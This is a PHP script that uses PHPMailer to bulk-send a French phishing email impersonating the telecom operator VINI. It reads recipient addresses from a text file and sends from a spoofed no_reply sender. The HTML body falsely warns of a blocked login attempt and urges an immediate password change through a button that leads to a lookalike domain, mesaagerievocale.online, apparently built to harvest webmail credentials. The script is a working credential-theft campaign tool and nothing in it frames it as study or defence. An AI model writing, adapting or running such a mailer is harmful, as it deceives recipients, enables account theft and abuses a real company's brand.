<?php
require __DIR__ . '/vendor/autoload.php';
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Emails en dur
$recipients = [
    'admin@leswac.com',
    'check@mesaagerievocale.online',
    'contacto@mesaagerievocale.online',
    // Ajoute d'autres manuellement ici si besoin
];

// 🔍 Charger les emails depuis le fichier .txt
$filePath = __DIR__ . '/emails.txt';
if (file_exists($filePath)) {
    $fileEmails = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    // Nettoyage + fusion
    $recipients = array_unique(array_merge($recipients, $fileEmails));
} else {
    echo "⚠️ Fichier 'emails.txt' introuvable.<br>";
}

// ✅ Contenu HTML (repris tel que fourni précédemment)
$htmlContent = <<<'HTML'
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Alerte Sécurité VINI</title>
  <style>
    body {
      margin: 0;
      background: #d1d3d4;
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 700px;
      margin: 0 auto;
      background: white;
    }
    .header {
      background: #e31e24;
      padding: 20px;
      color: white;
      text-align: right;
      font-size: 12px;
      font-weight: bold;
      line-height: 1.6em;
    }
    .header .logo {
      margin-top: 10px;
    }
    .content {
      padding: 30px;
      background: #ffffff;
      font-size: 14px;
      color: #333;
    }
    .security-message {
      padding: 20px;
      border-radius: 5px;
      background: #ffffff;
      box-shadow: 0 0 5px rgba(0,0,0,0.05);
    }
    .security-message strong {
      color: #e31e24;
    }
    .button {
      display: block;
      margin: 20px auto 0;
      padding: 10px 20px;
      background-color: #e31e24;
      color: white;
      text-decoration: none;
      border-radius: 4px;
      font-weight: bold;
      text-align: center;
      width: fit-content;
    }
    .footer {
      background: #4d4d4d;
      color: white;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 30px;
    }
    .footer .icons img {
      width: 30px;
      margin-right: 10px;
    }
    .footer .contact {
      font-weight: bold;
    }
    .copyright {
      text-align: center;
      padding: 15px;
      font-size: 12px;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      MOBILE<br>
      INTERNET<br>
      TELEVISION<br>
      TELEPHONIE FIXE<br>
      <div class="logo">
        <img src="https://ci3.googleusercontent.com/meips/ADKq_NbBEQKnfmKc-f43w4rsMfbiMRZIKBO0ulJD_1KWDDB25gFFAitLSXo4PZuAoy59qVFrAPGaD1V2nCLK_5HuzaR-yIZDNv2F3XrdXrH46MIVFA=s0-d-e1-ft#https://www.vini.pf/sites/default/files/logo-vini-email.png" alt="Vini logo" height="30">
      </div>
    </div>
    <div class="content">
      <div class="security-message">
        <p><strong>Bonjour,</strong></p>
        <p>Nous avons bloqué une tentative de connexion inhabituelle à votre compte VINI WebMail.</p>
        <p>Pour votre sécurité, merci de <strong>changer votre mot de passe immédiatement</strong>.</p>
        <a class="button" href="https://mesaagerievocale.online/VINI/">Modifier mon mot de passe</a>
        <p style="margin-top:20px;">Si cette tentative vient bien de vous (ex. voyage), vous pouvez ignorer ce message.</p>
        <p>Merci de votre vigilance,<br>Le Service Client VINI</p>
      </div>
    </div>
    <div class="footer">
      <div class="icons">
        <img src="https://ci3.googleusercontent.com/meips/ADKq_NbZSFnmOQux1qUcR-CNc0NpEL4aZLwg2YtdiRp5Zrz2Ecv-qT73kqJXXb01B0gX-f2yfCN79lC2SjKN10sKiDaCExIsyNFnquMCgrW2l2hoTfFSpOAiNjkmbaUUI-q9SB1d00IJAic2=s0-d-e1-ft#https://img.mailinblue.com/1050230/images/rnb/thumbs/550a2aff8cc34ec16e8b5c30.jpeg" alt="vini icon">
        <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="facebook" width="30">
        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="youtube" width="30">
      </div>
      <div class="contact">Contact : 39 50</div>
    </div>
    <div class="copyright">
      © Copyright - Vini - Tous droits réservés
    </div>
  </div>
</body>
</html>

HTML;

// 🔄 Envoi des emails
$successCount = 0;
$failureCount = 0;

foreach ($recipients as $email) {
    $mail = new PHPMailer(true);
    try {
        $mail->CharSet = 'UTF-8';
        $mail->isMail(); // isSMTP() si serveur SMTP
        $mail->setFrom('no_reply@onati.pf', 'Vini');
        $mail->addBCC($email);
        $mail->Subject = 'Action requise : une activité inhabituelle a été détectée ';
        $mail->isHTML(true);
        $mail->Body = $htmlContent;

        if ($mail->send()) {
            $successCount++;
        } else {
            $failureCount++;
        }
    } catch (Exception $e) {
        $failureCount++;
        echo "❌ Erreur à $email : " . $mail->ErrorInfo . "<br>";
    }
}

//  Résumé
echo "✔️ Emails envoyés avec succès : $successCount<br>";
echo "❌ Échecs d'envoi : $failureCount<br>";
?>
